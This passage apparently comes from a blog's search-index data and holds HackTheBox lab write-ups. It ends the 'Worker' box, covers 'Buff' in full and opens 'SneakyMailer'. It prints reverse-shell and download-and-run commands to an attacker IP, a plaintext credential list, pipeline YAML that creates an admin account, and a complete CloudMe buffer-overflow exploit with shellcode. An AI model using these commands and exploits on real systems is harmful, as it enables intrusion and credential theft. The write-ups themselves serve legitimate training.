repository.\nI\u0026rsquo;ll pick any available work items.\nI can just drag and drop the web shell, and commit it afterwards.\nFrom here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.\nIf I choose a pull request, it needs to be reviewed first and the reviewer is the user nathen itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.\nThe other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).\nAfter the build finished, I can see my web shell is available at alpha.worker.htb/cmdasp.aspx.\nTo gain an interactive shell, I\u0026rsquo;ll setup a netcat listener on my Kali, then I\u0026rsquo;ll upload a PowerShell reverse shell called itsf.ps1 and execute it via the web shell.\npowershell.exe \u0026#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\\temp\\itsf.ps1;C:\\temp\\itsf.ps1\u0026#34; I have a shell now on my listener.\nPrivilege Escalation Shell as robisl Internal Enumeration Enumerating the user groups and privileges using the whoami /all command reveals that IIS appool has SeImpersonatePrivilege which according to BookHackTrick, it can be abused using RogueWinRM.\nUnfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!\nEnumerating the Users folder finds two users, robisl and restorer (as the name implies, it restore the box configuration, I\u0026rsquo;ll ignore this).\nBy using the net command, it shows that robisl can login remotely.\nPS C:\\Users\u0026gt; net user robisl User name robisl Full Name Robin Islip Comment User’s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2020-04-05 21:27:26 Password expires Never Password changeable 2020-04-05 21:27:26 Password required No User may change password No Workstations allowed All Logon script User profile Home directory Last logon 2020-08-18 18:28:36 Logon hours allowed All Local Group Memberships *Production *Remote Global Group memberships *None The command completed successfully. With net command, I also find there is another drive mounted as W:\\\nPS C:\\users\\\u0026gt;net share Share name Resource Remark ------------------------------------------------------------------------------- C$ C:\\ Default share IPC$ Remote IPC W$ W:\\ Default share ADMIN$ C:\\Windows Remote Admin The command completed successfully. There are 4 folders in the W:\\ drive, the one that interesting is the svnrepos folder.\nPS W:\\\u0026gt; dir Directory: W:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2020-06-16 18:59 agents d----- 2020-03-28 15:57 AzureDevOpsData d----- 2020-04-03 11:31 sites d----- 2020-06-20 16:04 svnrepos I can enumerate all folder and sub folder on the W:\\ drive recursively using the dir command. Because I\u0026rsquo;m on PowerShell, I have to use cmd /c \u0026lt;command\u0026gt; keyword.\nPS W:\\\u0026gt; cmd.exe /c \u0026quot;dir /s /b svnrepos\u0026quot; Well PowerShell can do that too, but I prefer cmd.\nPS W:\\\u0026gt; Get-ChildItem -Path W:\\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force In the output, there is a passwd file that immediately draws my attention\nThe passwd file contains a bunch of credentials, and my eyes caught the password for robisl.\nPS W:\\svnrepos\\\u0026gt; gc .\\www\\conf\\passwd ### This file is an example password file for svnserve. ### Its format is similar to that of svnserve.conf. As shown in the ### example below it contains one section labelled [users]. ### The name and password for each user follow, one account per line. [users] nathen = wendel98 nichin = fqerfqerf nichin = asifhiefh noahip = player nuahip = wkjdnw oakhol = bxwdjhcue owehol = supersecret paihol = painfulcode parhol = gitcommit pathop = iliketomoveit pauhor = nowayjose payhos = icanjive perhou = elvisisalive peyhou = ineedvacation phihou = pokemon quehub = pickme quihud = kindasecure rachul = guesswho raehun = idontknow ramhun = thisis ranhut = getting rebhyd = rediculous reeinc = iagree reeing = tosomepoint reiing = isthisenough renipr = dummy rhiire = users riairv = canyou ricisa = seewhich robish = onesare robisl = wolves11 robive = andwhich ronkay = onesare rubkei = the rupkel = sheeps ryakel = imtired sabken = drjones samken = aqua sapket = hamburger sarkil = friday Remote Access - robisl I can login remotely using robisl credentials with evil-winrm.\n→ root@kali «worker» «10.10.14.19» $ evil-winrm -i 10.10.10.203 -u robisl -p wolves11 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\robisl\\Documents\u0026gt; whoami worker\\robisl *Evil-WinRM* PS C:\\Users\\robisl\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\robisl\\Desktop\u0026gt; dir Directory: C:\\Users\\robisl\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 1/29/2020 3:37 PM 34 user.txt Shell as administrator Azure DevOps - PartsUnlimited After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a robisl account.\nLong short story, robisl  is member of Build Administrator.\nThe Build Administrators defined as follows [source].\nExploit Azure Pipelines - Read the Root Flag So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.\nIf I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user robisl also has access to it.\nSo, let’s execute the plan!\nFirst, I’ll create a pipeline (Pipelines -\u0026gt; Builds -\u0026gt; New Pipeline).\nIn the next section, I’ll choose Azure Repos Git.\nOn the next one, I’ll select \u0026ldquo;PartsUnlimited\u0026rdquo; as the repository, because that is the repo where robisl is working on.\nIn the Configure section, scroll down and select the starter pipeline (I forgot the name, but don\u0026rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the \u0026ldquo;Review\u0026rdquo; section to steal the flag.\nThe master branch will be the trigger to run the CI\\CD (If I push a changes to the \u0026ldquo;PartsUnlimited\u0026rdquo; repository). Since I have access to the \u0026ldquo;Setup\u0026rdquo; pool, I\u0026rsquo;ll use it as the pool. Lastly, on the steps you can add a task/script you want to run/do. In my case, I want to read the root flag.\nI’ll save it and run it on a new branch.\nI’ll just wait for the output log.\nOnce it completed, I can see the root flag inside the \u0026ldquo;Steal the flag\u0026rdquo; output\nCreate User with Administrator Privileges I can also create a privileged user using multi-line script.\n- script: | net user iamf YourComplexPassword /add /domain net localgroup Administrators iamf /add net localgroup \u0026quot;Remote Management Users\u0026quot; iamf /add displayName: \u0026quot;Set IamF to Admin\u0026quot; I can push it again and wait for it to complete.\nNow I can login with the newly created user.\n References:\n https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/ https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops\u0026amp;tabs=yaml#ci-triggers  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-worker/","summary":"Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps.","tags":["OSCP-like","Windows","Svn","Webshell","Azure-DevOps","Azure-Pipelines","evil-winrm"],"title":"HackTheBox - Worker"},{"content":"Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called \u0026ldquo;Gym Management System\u0026rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator. Because it is bound to the loopback interface, hence a setup for port forwarding is required before sending the exploit.\nSkills Learned  Gym Management System 1.0 Exploitation Port Forwarding CloudMe 1.12 Exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux searchsploit/Exploit-DB - Preinstalled in Kali Linux chisel - https://github.com/jpillora/chisel/releases msfvenom - Preinstalled in Kali Linux  Reconnaissance Nmap An initial scan with nmap only discovers one port open on 8080 running an Apache web server.\n→ root@kali «~» «10.10.14.18» $ mkdir nmap; nmap -sC -sV -oN nmap/initial-buff -v 10.10.10.198 PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n’s Bro Hut Enumeration TCP 8080 - Website Visiting port 8080 displays a website for a Gym, on the title it is called \u0026ldquo;mrb3n\u0026rsquo;s Bro Hut\u0026rdquo;.\nClicking on the contact page discovers the name of the software behind this web application.\nSearchsploit I can feed the software name to searchsploit. It shows several exploits, and one that stands out is the remote code execution.\n→ root@kali «machines» «10.10.14.18» $ searchsploit Gym Management System 1.0 ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- Gym Management System 1.0 - \u0026#39;id\u0026#39; SQL Injection | php/webapps/48936.txt Gym Management System 1.0 - Authentication Bypass | php/webapps/48940.txt Gym Management System 1.0 - Stored Cross Site Scripting | php/webapps/48941.txt Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py ------------------------------------------------------------------------------- --------------------------------- Foothold Shell as shaun searchsploit -m allows me to mirror/make a copy of the \u0026ldquo;Gym Management System 1.0 - Unauthenticated Remote Code Execution\u0026rdquo; exploit to the current working directory\n→ root@kali «exploit» «10.10.14.18» $ searchsploit -m 48506 Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py File Type: Python script, ASCII text executable, with CRLF line terminators Copied to: /root/htb/machines/buff/exploit/48506.py → root@kali «exploit» «10.10.14.18» $ ls -l total 8 -rwxr-xr-x 1 root root 5164 May 2 04:29 48506.py I’ll rename 48506.py to exploit.py, and run it afterwards.\n→ root@kali «exploit» «10.10.14.18» $ python exploit.py http://10.10.10.198:8080/ With current pseudo shell access, I can\u0026rsquo;t change my directory but I can still grab the user flag.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; type \\users\\shaun\\desktop\\user.txt Upgrade to Interactive Shell To make the shell a bit more comfy, I uploaded a netcat using powershell to Buff, and then I\u0026rsquo;ll create another reverse shell session.\nFirst, I\u0026rsquo;ll host the 64 bit netcat, nc64.exe.\n→ root@kali «buff» «10.10.14.18» $ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.198 - - [14/Aug/2020 10:11:02] \u0026#34;GET /nc64.exe HTTP/1.1\u0026#34; 200 On Buff, I\u0026rsquo;ll grab the hosted nc64.exe using PowerShell.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; powershell.exe \u0026#34;invoke-webrequest -uri http://10.10.14.18/nc64.exe -outfile nc.exe\u0026#34; Now I\u0026rsquo;ll setup a listener on my Kali, and send a reverse shell from Buff using the downloaded nc.exe.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt;.\\nc.exe -e cmd.exe 10.10.14.18 9001 I have a \u0026ldquo;proper\u0026rdquo; shell now\n→ root@kali «buff» «10.10.14.18» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.10.198] 64518 Microsoft Windows [Version 10.0.17134.1550] (c) 2018 Microsoft Corporation. All rights reserved. C:\\xampp\\htdocs\\gym\\upload\u0026gt; Privilege Escalation Shell as Administrator Enumeration After enumerating the Users folder, I noticed a slightly different output when typing the dir command in shaun home directory.\nIn the Download folder, there is an executable file called CloudMe_1112.exe where 1112 is likely a version number.\nChecking on currently running services with netstat discovers.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; netstat -aonp tcp Active Connections Proto Local Address Foreign Address State PID ...\u0026lt;SNIP\u0026gt;... TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 7352 ...\u0026lt;SNIP\u0026gt;... I can search the program name using the tasklist command.\nC:\\xampp\\htdocs\\gym\\upload\u0026gt; tasklist /FI “PID eq 7352\u0026quot; /v /FO list So PID 7352 on port 8888 is running CloudMe.exe.\nBecause the user name field is showing as N/A, one possible thing is that I don’t have enough privilege to dig for more information about the process because it might be running with a higher privilege (either administrator or a local system).\nSearchsploit A quick search about \u0026ldquo;CloudMe\u0026rdquo; on searchsploit pops several buffer overflow exploits with four of them are exact match.\n→ root@kali «buff» «10.10.14.18» $ searchsploit CloudMe ------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR) | windows/local/48840.py Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit) | windows_x86-64/remote/45197.rb CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass) | windows_x86-64/local/45159.py CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit) | windows/remote/44175.rb CloudMe Sync 1.11.0 - Local Buffer Overflow | windows/local/44470.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync \u0026lt; 1.11.0 - Buffer Overflow | windows/remote/44027.py CloudMe Sync \u0026lt; 1.11.0 - Buffer Overflow (SEH) (DEP Bypass) | windows_x86-64/remote/44784.py ------------------------------------------------------------------------------- --------------------------------- Tunneling The CloudMe program is currently listening on localhost (bound), so to interact with it, I\u0026rsquo;ll have to setup a tunnel/port forwarding. For this, I\u0026rsquo;ll use chisel (https://github.com/jpillora/chisel/releases).\n Example usage of chisel is explained better in this blog :\n https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel   First, I\u0026rsquo;ll transfer the Windows version of chisel to Buff via PowerShell.\nC:\\Users\\shaun\\Download\u0026gt; powershell.exe \u0026#34;invoke-webrequest -uri http://10.10.14.18/chisel.exe -outfile cs.exe\u0026#34; Second, I\u0026rsquo;ll setup a chisel server on my Kali.\n→ root@kali «buff» «10.10.14.18» $ chisel server -p 9002 2020/08/14 13:22:18 server: Fingerprint 35:fe:d3:dd:6c:b3:63:35:87:6a:f2:70:52:f1:82:e2 2020/08/14 13:22:18 server: Listening on 0.0.0.0:9002... On Buff, I\u0026rsquo;ll connect as client to my chisel server on Kali.\nC:\\Users\\shaun\\Download\u0026gt; .\\cs.exe client 10.10.14.18:9002 R:8888:127.0.0.1:8888 This, will forward the traffics that sent from my Kali Linux on port 8888 to Buff\u0026rsquo;s localhost on port 8888.\nKali localhost:8888 \u0026lt;-\u0026gt; (Kali 10.10.14.18:9002 \u0026lt;-\u0026gt; Buff:10.10.10.198:XXX) \u0026lt;-\u0026gt; Buff localhost:8888 Exploitation CloudMe 1.11.2 I\u0026rsquo;ll use this exploit PoC (I\u0026rsquo;ve renamed it to bofexploit.py) but I\u0026rsquo;ll have to modify the payload with my own.\n# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC) # Date: 2020-04-27 # Exploit Author: Andy Bowden # Vendor Homepage: https://www.cloudme.com/en # Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe # Version: CloudMe 1.11.2 # Tested on: Windows 10 x86 #Instructions: # Start the CloudMe service and run the script. import socket target = \u0026#34;127.0.0.1\u0026#34; padding1 = b\u0026#34;\\x90\u0026#34; * 1052 EIP = b\u0026#34;\\xB5\\x42\\xA8\\x68\u0026#34; # 0x68A842B5 -\u0026gt; PUSH ESP, RET NOPS = b\u0026#34;\\x90\u0026#34; * 30 #msfvenom -a x86 -p windows/exec CMD=calc.exe -b \u0026#39;\\x00\\x0A\\x0D\u0026#39; -f python payload = b\u0026#34;\\xba\\xad\\x1e\\x7c\\x02\\xdb\\xcf\\xd9\\x74\\x24\\xf4\\x5e\\x33\u0026#34; payload += b\u0026#34;\\xc9\\xb1\\x31\\x83\\xc6\\x04\\x31\\x56\\x0f\\x03\\x56\\xa2\\xfc\u0026#34; payload += b\u0026#34;\\x89\\xfe\\x54\\x82\\x72\\xff\\xa4\\xe3\\xfb\\x1a\\x95\\x23\\x9f\u0026#34; payload += b\u0026#34;\\x6f\\x85\\x93\\xeb\\x22\\x29\\x5f\\xb9\\xd6\\xba\\x2d\\x16\\xd8\u0026#34; payload += b\u0026#34;\\x0b\\x9b\\x40\\xd7\\x8c\\xb0\\xb1\\x76\\x0e\\xcb\\xe5\\x58\\x2f\u0026#34; payload += b\u0026#34;\\x04\\xf8\\x99\\x68\\x79\\xf1\\xc8\\x21\\xf5\\xa4\\xfc\\x46\\x43\u0026#34; payload += b\u0026#34;\\x75\\x76\\x14\\x45\\xfd\\x6b\\xec\\x64\\x2c\\x3a\\x67\\x3f\\xee\u0026#34; payload += b\u0026#34;\\xbc\\xa4\\x4b\\xa7\\xa6\\xa9\\x76\\x71\\x5c\\x19\\x0c\\x80\\xb4\u0026#34; payload += b\u0026#34;\\x50\\xed\\x2f\\xf9\\x5d\\x1c\\x31\\x3d\\x59\\xff\\x44\\x37\\x9a\u0026#34; payload += b\u0026#34;\\x82\\x5e\\x8c\\xe1\\x58\\xea\\x17\\x41\\x2a\\x4c\\xfc\\x70\\xff\u0026#34; payload += b\u0026#34;\\x0b\\x77\\x7e\\xb4\\x58\\xdf\\x62\\x4b\\x8c\\x6b\\x9e\\xc0\\x33\u0026#34; payload += b\u0026#34;\\xbc\\x17\\x92\\x17\\x18\\x7c\\x40\\x39\\x39\\xd8\\x27\\x46\\x59\u0026#34; payload += b\u0026#34;\\x83\\x98\\xe2\\x11\\x29\\xcc\\x9e\\x7b\\x27\\x13\\x2c\\x06\\x05\u0026#34; payload += b\u0026#34;\\x13\\x2e\\x09\\x39\\x7c\\x1f\\x82\\xd6\\xfb\\xa0\\x41\\x93\\xf4\u0026#34; payload += b\u0026#34;\\xea\\xc8\\xb5\\x9c\\xb2\\x98\\x84\\xc0\\x44\\x77\\xca\\xfc\\xc6\u0026#34; payload += b\u0026#34;\\x72\\xb2\\xfa\\xd7\\xf6\\xb7\\x47\\x50\\xea\\xc5\\xd8\\x35\\x0c\u0026#34; payload += b\u0026#34;\\x7a\\xd8\\x1f\\x6f\\x1d\\x4a\\xc3\\x5e\\xb8\\xea\\x66\\x9f\u0026#34; overrun = b\u0026#34;C\u0026#34; * (1500 - len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) To generate new payload, I\u0026rsquo;ll follow the instruction on the PoC code which is using msfvenom. But, instead of running calc.exe, I\u0026rsquo;ll change it to execute the netcat I\u0026rsquo;ve uploaded before during upgrading the shaun shell.\n→ root@kali «buff» «10.10.14.18» $ msfvenom -p windows/exec CMD=\u0026#39;C:\\xampp\\htdocs\\gym\\upload\\nc.exe -e cmd.exe 10.10.14.18 9005\u0026#39; -b \u0026#39;\\x00\\x0A\\x0D\u0026#39; -f python -v payload ...\u0026lt;SNIP\u0026gt;... payload += b\u0026#34;\\xbe\\xd0\\xe7\\xa9\\x73\\xd9\\xc7\\xd9\\x74\\x24\\xf4\\x5f\u0026#34; payload += b\u0026#34;\\x31\\xc9\\xb1\\x3e\\x31\\x77\\x12\\x03\\x77\\x12\\x83\\x17\u0026#34; payload += b\u0026#34;\\xe3\\x4b\\x86\\x6b\\x04\\x09\\x69\\x93\\xd5\\x6e\\xe3\\x76\u0026#34; payload += b\u0026#34;\\xe4\\xae\\x97\\xf3\\x57\\x1f\\xd3\\x51\\x54\\xd4\\xb1\\x41\u0026#34; payload += b\u0026#34;\\xef\\x98\\x1d\\x66\\x58\\x16\\x78\\x49\\x59\\x0b\\xb8\\xc8\u0026#34; payload += b\u0026#34;\\xd9\\x56\\xed\\x2a\\xe3\\x98\\xe0\\x2b\\x24\\xc4\\x09\\x79\u0026#34; payload += b\u0026#34;\\xfd\\x82\\xbc\\x6d\\x8a\\xdf\\x7c\\x06\\xc0\\xce\\x04\\xfb\u0026#34; payload += b\u0026#34;\\x91\\xf1\\x25\\xaa\\xaa\\xab\\xe5\\x4d\\x7e\\xc0\\xaf\\x55\u0026#34; payload += b\u0026#34;\\x63\\xed\\x66\\xee\\x57\\x99\\x78\\x26\\xa6\\x62\\xd6\\x07\u0026#34; payload += b\u0026#34;\\x06\\x91\\x26\\x40\\xa1\\x4a\\x5d\\xb8\\xd1\\xf7\\x66\\x7f\u0026#34; payload += b\u0026#34;\\xab\\x23\\xe2\\x9b\\x0b\\xa7\\x54\\x47\\xad\\x64\\x02\\x0c\u0026#34; payload += b\u0026#34;\\xa1\\xc1\\x40\\x4a\\xa6\\xd4\\x85\\xe1\\xd2\\x5d\\x28\\x25\u0026#34; payload += b\u0026#34;\\x53\\x25\\x0f\\xe1\\x3f\\xfd\\x2e\\xb0\\xe5\\x50\\x4e\\xa2\u0026#34; payload += b\u0026#34;\\x45\\x0c\\xea\\xa9\\x68\\x59\\x87\\xf0\\xe6\\x9c\\x15\\x8f\u0026#34; payload += b\u0026#34;\\x45\\x9e\\x25\\x8f\\xf9\\xf7\\x14\\x04\\x96\\x80\\xa8\\xcf\u0026#34; payload += b\u0026#34;\\xd2\\x7f\\xe3\\x4d\\x72\\xe8\\xaa\\x04\\xc6\\x75\\x4d\\xf3\u0026#34; payload += b\u0026#34;\\x05\\x80\\xce\\xf1\\xf5\\x77\\xce\\x70\\xf3\\x3c\\x48\\x69\u0026#34; payload += b\u0026#34;\\x89\\x2d\\x3d\\x8d\\x3e\\x4d\\x14\\xce\\xfa\\xed\\xe2\\xa3\u0026#34; payload += b\u0026#34;\\x9f\\x7f\\x7e\\x1f\\x13\\xe8\\xe1\\xea\\xbd\\xb4\\x85\\x7b\u0026#34; payload += b\u0026#34;\\x35\\x2b\\x2a\\xec\\xd8\\xd7\\xc1\\xae\\x74\\x7b\\x08\\x2b\u0026#34; payload += b\u0026#34;\\xf1\\x1e\\x74\\x9e\\x64\\xc1\\x17\\x8d\\x02\\x2f\\xbd\\x35\u0026#34; payload += b\u0026#34;\\xae\\x0f\\x0c\\xf5\\x1e\\x61\\x5e\\xdb\\x6f\\xb5\\xb0\\x16\u0026#34; payload += b\u0026#34;\\xa4\\x95\\xf5\\x68\\xf4\\xe0\\x05\u0026#34; After removed the comments and changed the payload, the bofexploit.py now look like this:\nimport socket target = \u0026#34;127.0.0.1\u0026#34; padding1 = b\u0026#34;\\x90\u0026#34; * 1052 EIP = b\u0026#34;\\xB5\\x42\\xA8\\x68\u0026#34; # 0x68A842B5 -\u0026gt; PUSH ESP, RET NOPS = b\u0026#34;\\x90\u0026#34; * 30 payload += b\u0026#34;\\xbe\\xd0\\xe7\\xa9\\x73\\xd9\\xc7\\xd9\\x74\\x24\\xf4\\x5f\u0026#34; payload += b\u0026#34;\\x31\\xc9\\xb1\\x3e\\x31\\x77\\x12\\x03\\x77\\x12\\x83\\x17\u0026#34; payload += b\u0026#34;\\xe3\\x4b\\x86\\x6b\\x04\\x09\\x69\\x93\\xd5\\x6e\\xe3\\x76\u0026#34; payload += b\u0026#34;\\xe4\\xae\\x97\\xf3\\x57\\x1f\\xd3\\x51\\x54\\xd4\\xb1\\x41\u0026#34; payload += b\u0026#34;\\xef\\x98\\x1d\\x66\\x58\\x16\\x78\\x49\\x59\\x0b\\xb8\\xc8\u0026#34; payload += b\u0026#34;\\xd9\\x56\\xed\\x2a\\xe3\\x98\\xe0\\x2b\\x24\\xc4\\x09\\x79\u0026#34; payload += b\u0026#34;\\xfd\\x82\\xbc\\x6d\\x8a\\xdf\\x7c\\x06\\xc0\\xce\\x04\\xfb\u0026#34; payload += b\u0026#34;\\x91\\xf1\\x25\\xaa\\xaa\\xab\\xe5\\x4d\\x7e\\xc0\\xaf\\x55\u0026#34; payload += b\u0026#34;\\x63\\xed\\x66\\xee\\x57\\x99\\x78\\x26\\xa6\\x62\\xd6\\x07\u0026#34; payload += b\u0026#34;\\x06\\x91\\x26\\x40\\xa1\\x4a\\x5d\\xb8\\xd1\\xf7\\x66\\x7f\u0026#34; payload += b\u0026#34;\\xab\\x23\\xe2\\x9b\\x0b\\xa7\\x54\\x47\\xad\\x64\\x02\\x0c\u0026#34; payload += b\u0026#34;\\xa1\\xc1\\x40\\x4a\\xa6\\xd4\\x85\\xe1\\xd2\\x5d\\x28\\x25\u0026#34; payload += b\u0026#34;\\x53\\x25\\x0f\\xe1\\x3f\\xfd\\x2e\\xb0\\xe5\\x50\\x4e\\xa2\u0026#34; payload += b\u0026#34;\\x45\\x0c\\xea\\xa9\\x68\\x59\\x87\\xf0\\xe6\\x9c\\x15\\x8f\u0026#34; payload += b\u0026#34;\\x45\\x9e\\x25\\x8f\\xf9\\xf7\\x14\\x04\\x96\\x80\\xa8\\xcf\u0026#34; payload += b\u0026#34;\\xd2\\x7f\\xe3\\x4d\\x72\\xe8\\xaa\\x04\\xc6\\x75\\x4d\\xf3\u0026#34; payload += b\u0026#34;\\x05\\x80\\xce\\xf1\\xf5\\x77\\xce\\x70\\xf3\\x3c\\x48\\x69\u0026#34; payload += b\u0026#34;\\x89\\x2d\\x3d\\x8d\\x3e\\x4d\\x14\\xce\\xfa\\xed\\xe2\\xa3\u0026#34; payload += b\u0026#34;\\x9f\\x7f\\x7e\\x1f\\x13\\xe8\\xe1\\xea\\xbd\\xb4\\x85\\x7b\u0026#34; payload += b\u0026#34;\\x35\\x2b\\x2a\\xec\\xd8\\xd7\\xc1\\xae\\x74\\x7b\\x08\\x2b\u0026#34; payload += b\u0026#34;\\xf1\\x1e\\x74\\x9e\\x64\\xc1\\x17\\x8d\\x02\\x2f\\xbd\\x35\u0026#34; payload += b\u0026#34;\\xae\\x0f\\x0c\\xf5\\x1e\\x61\\x5e\\xdb\\x6f\\xb5\\xb0\\x16\u0026#34; payload += b\u0026#34;\\xa4\\x95\\xf5\\x68\\xf4\\xe0\\x05\u0026#34; overrun = b\u0026#34;C\u0026#34; * (1500 — len(padding1 + NOPS + EIP + payload)) buf = padding1 + EIP + NOPS + payload + overrun try: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value) The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.\n→ root@kali «buff» «10.10.14.18» $ python2 bofexploit.py On my listener:\nNow I can grab the root flag or dump the hashes.\n References  https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-buff/","summary":"Buff is a Windows machine with easy difficulty from HackTheBox that features an open source web application called \u0026ldquo;Gym Management System\u0026rdquo;. The application can be exploited using a publicly available exploit. Internal enumeration discovers a program service that is bound to the loopback interface. The program is found to be vulnerable to a buffer overflow attack, and there is also a publicly available exploit to exploit it to gain access as Administrator.","tags":["OSCP-like","Windows","Webshell","CloudMe","Buffer-overflow","Tunneling","Chisel"],"title":"HackTheBox - Buff"},{"content":"SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.\nSkills Learned  Phishing PyPI Package Exploitation Exploiting sudo privileges on pip3  Reconnaissance Nmap → root@iamf «sneakymailer» «10.10.14.42» $ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA) | 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA) |_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Did not follow redirect to http://sneakycorp.htb 143/tcp open imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE STARTTLS UTF8=ACCEPTA0001 CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 993/tcp open ssl/imap Courier Imapd (released 2018) |_imap-capabilities: ENABLE AUTH=PLAIN CHILDREN ACL ACL2=UNION THREAD=ORDEREDSUBJECT THREAD=REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8=ACCEPTA0001 NAMESPACE | ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US | Subject Alternative Name: email:postmaster@example.com | Not valid before: 2020-05-14T17:14:21 |_Not valid after: 2021-05-14T17:14:21 |_ssl-date: TLS randomness does not represent time 8080/tcp open http nginx 1.14.2 |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: nginx/1.14.2 |_http-title: Welcome to nginx! Service Info: Host: debian; OSs: Unix, Linux; 